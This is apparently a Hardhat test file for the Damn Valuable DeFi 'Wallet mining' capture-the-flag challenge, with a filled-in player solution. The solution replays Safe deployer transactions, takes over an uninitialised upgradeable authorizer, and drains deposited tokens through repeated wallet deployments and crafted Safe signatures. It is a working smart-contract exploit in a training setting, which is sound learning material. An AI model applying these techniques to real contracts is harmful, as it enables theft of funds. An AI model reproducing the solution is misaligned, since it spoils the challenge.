const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Wallet mining", function () {
  let deployer, player;
  let token, authorizer, walletDeployer;
  let initialWalletDeployerTokenBalance;

  const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, ward, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy authorizer with the corresponding proxy
    authorizer = await upgrades.deployProxy(
      await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
      { kind: "uups", initializer: "init" }
    );

    expect(await authorizer.owner()).to.eq(deployer.address);
    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

    // Deploy Safe Deployer contract
    walletDeployer = await (
      await ethers.getContractFactory("WalletDeployer", deployer)
    ).deploy(token.address);
    expect(await walletDeployer.chief()).to.eq(deployer.address);
    expect(await walletDeployer.gem()).to.eq(token.address);

    // Set Authorizer in Safe Deployer
    await walletDeployer.rule(authorizer.address);
    expect(await walletDeployer.mom()).to.eq(authorizer.address);

    await expect(
      walletDeployer.can(ward.address, DEPOSIT_ADDRESS)
    ).not.to.be.reverted;
    await expect(
      walletDeployer.can(player.address, DEPOSIT_ADDRESS)
    ).to.be.reverted;

    // Fund Safe Deployer with tokens
    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
    await token.transfer(
      walletDeployer.address,
      initialWalletDeployerTokenBalance
    );

    // Ensure these accounts start empty
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq(
      "0x"
    );
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq(
      "0x"
    );

    // Deposit large amount of DVT tokens to the deposit address
    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are set correctly
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).eq(
      initialWalletDeployerTokenBalance
    );
    expect(await token.balanceOf(player.address)).eq(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const txData = require("./tx.json");
    await player.sendTransaction({
      //gnosis safe deployer
      to: "0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a",
      value: ethers.utils.parseEther("1"),
    });

    await ethers.provider.sendTransaction(txData.tx0);
    await ethers.provider.sendTransaction(txData.tx1);
    await ethers.provider.sendTransaction(txData.tx2);
    let imp = await ethers.provider.getStorageAt(
      authorizer.address,
      "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    );
    console.log("imp", imp);

    let testWalletMining = await (
      await ethers.getContractFactory("testWalletMining", player)
    ).deploy(
      authorizer.address,
      player.address,
      token.address,
      walletDeployer.address,
      ethers.utils.getAddress("0x" + imp.slice(26))
    );
    imp = await ethers.provider.getStorageAt(
      authorizer.address,
      "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    );
    console.log("imp after", imp);
    console.log(
      await ethers.provider.getCode(
        ethers.utils.getAddress("0x" + imp.slice(26))
      )
    );

    const initData = testWalletMining.interface.encodeFunctionData("setup", [
      [player.address],
      1,
      "0x0000000000000000000000000000000000000000",
      "0x",
      "0x0000000000000000000000000000000000000000",
      "0x0000000000000000000000000000000000000000",
      0,
      "0x0000000000000000000000000000000000000000",
    ]);
    for (let i = 0; i < 43; i++) {
      let tx = await walletDeployer.connect(player).drop(initData);
      const txReceipt = await tx.wait();
      const [deployEvent] = txReceipt.events;

      console.log(
        "tx",
        i,
        ethers.utils.getAddress("0x" + deployEvent.data.slice(26))
      );
      const GnosisSafe = await ethers.getContractFactory("GnosisSafe");
      let wallet = await GnosisSafe.attach("0x" + deployEvent.data.slice(26));
      let transferData = token.interface.encodeFunctionData("transfer", [
        player.address,
        10n ** 18n,
      ]);
      let hash = await wallet.getTransactionHash(
        token.address, //to
        0, //value
        transferData, //data
        0, //operation
        0, //safeTxGas
        0, //baseGas
        0, //gasPrice
        "0x0000000000000000000000000000000000000000", //gasToken
        "0x0000000000000000000000000000000000000000", //refundReceiver
        0 //nonce
      );

      let sigs = await player.signMessage(ethers.utils.arrayify(hash));
      let sigsSplited = ethers.utils.splitSignature(sigs);
      sigsSplited.v += 4;
      sigs =
        sigsSplited.r + sigsSplited.s.substring(2) + sigsSplited.v.toString(16);
      // console.log(sigs);

      await wallet
        .connect(player)
        .execTransaction(
          token.address,
          0,
          transferData,
          0,
          0,
          0,
          0,
          "0x0000000000000000000000000000000000000000",
          "0x0000000000000000000000000000000000000000",
          sigs
        );
      let code = await ethers.provider.getCode(DEPOSIT_ADDRESS);
      if (code !== "0x") {
        transferData = token.interface.encodeFunctionData("transfer", [
          player.address,
          DEPOSIT_TOKEN_AMOUNT - 10n ** 18n,
        ]);

        hash = await wallet.getTransactionHash(
          token.address, //to
          0, //value
          transferData, //data
          0, //operation
          0, //safeTxGas
          0, //baseGas
          0, //gasPrice
          "0x0000000000000000000000000000000000000000", //gasToken
          "0x0000000000000000000000000000000000000000", //refundReceiver
          1 //nonce
        );

        sigs = await player.signMessage(ethers.utils.arrayify(hash));
        sigsSplited = ethers.utils.splitSignature(sigs);
        sigsSplited.v += 4;
        sigs =
          sigsSplited.r +
          sigsSplited.s.substring(2) +
          sigsSplited.v.toString(16);

        await wallet
          .connect(player)
          .execTransaction(
            token.address,
            0,
            transferData,
            0,
            0,
            0,
            0,
            "0x0000000000000000000000000000000000000000",
            "0x0000000000000000000000000000000000000000",
            sigs
          );
        break;
      }
    }

    const tokenBalance = await token.balanceOf(DEPOSIT_ADDRESS);
    console.log("tokenBalance", tokenBalance.toString());
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    // Factory account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.fact())
    ).to.not.eq("0x");
    // Master copy account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.copy())
    ).to.not.eq("0x");
    // // Deposit account must have code
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");
    // The deposit address and the Safe Deployer contract must not hold tokens
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);
    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(
      initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)
    );
  });
});
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
